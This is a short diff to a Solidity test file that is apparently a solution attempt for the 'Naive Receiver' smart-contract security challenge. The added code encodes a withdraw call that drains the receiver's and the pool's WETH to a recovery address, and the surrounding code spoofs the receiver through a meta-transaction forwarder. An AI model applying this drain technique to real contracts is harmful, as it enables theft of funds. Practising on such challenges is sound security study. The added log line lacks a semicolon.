@@ -92,6 +92,9 @@ contract NaiveReceiverChallenge is Test {
             0,"");
         }
 
+        data[10] = abi.encodeWithSelector(pool.withdraw.selector,WETH_IN_RECEIVER + WETH_IN_POOL,address(recovery));
+
+        console.log(data)
         // spoof receiver
         BasicForwarder.Request memory request = BasicForwarder.Request({
             from :address(player),
@@ -115,7 +118,7 @@ contract NaiveReceiverChallenge is Test {
         bytes memory signature = abi.encodePacked(r,s,v);
         forwarder.execute(request,signature);
         console.log(weth.balanceOf(address(receiver)));
-
+        
         
     }
 
